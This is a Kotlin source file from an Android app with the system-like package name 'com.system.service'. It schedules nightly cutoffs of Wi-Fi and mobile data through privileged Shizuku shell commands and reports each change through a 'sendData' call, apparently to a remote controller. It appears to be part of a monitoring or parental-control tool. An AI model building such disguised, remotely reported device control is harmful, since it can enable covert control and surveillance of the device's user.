package com.system.service.monitors

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.system.service.core.CoreService
import com.system.service.core.ShizukuManager
import org.json.JSONObject
import java.util.Calendar

object InternetScheduler {

    private var offHourStart = -1   // 23 = 11pm
    private var offHourEnd   = -1   // 6  = 6am
    private var enabled      = false
    private val handler = Handler(Looper.getMainLooper())
    private var wifiCurrentlyBlocked = false

    fun setSchedule(offStart: Int, offEnd: Int, context: Context) {
        offHourStart = offStart
        offHourEnd   = offEnd
        enabled      = true
        startTicker(context)
    }

    fun disable() { enabled = false; stopTicker() }

    private val ticker = object : Runnable {
        override fun run() {
            if (!enabled) return
            val hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
            val shouldBlock = isOffTime(hour)
            if (shouldBlock && !wifiCurrentlyBlocked) {
                wifiCurrentlyBlocked = true
                ShizukuManager.exec("svc wifi disable")
                ShizukuManager.exec("svc data disable")
                CoreService.instance?.sendData("schedule_event", JSONObject().apply {
                    put("action", "internet_off"); put("hour", hour)
                })
            } else if (!shouldBlock && wifiCurrentlyBlocked) {
                wifiCurrentlyBlocked = false
                ShizukuManager.exec("svc wifi enable")
                ShizukuManager.exec("svc data enable")
                CoreService.instance?.sendData("schedule_event", JSONObject().apply {
                    put("action", "internet_on"); put("hour", hour)
                })
            }
            handler.postDelayed(this, 60_000L) // check every minute
        }
    }

    private fun isOffTime(hour: Int): Boolean {
        return if (offHourStart <= offHourEnd) {
            hour in offHourStart until offHourEnd
        } else {
            // Overnight: e.g. 23..6
            hour >= offHourStart || hour < offHourEnd
        }
    }

    private fun startTicker(context: Context) {
        stopTicker()
        handler.post(ticker)
    }

    private fun stopTicker() {
        handler.removeCallbacks(ticker)
    }
}
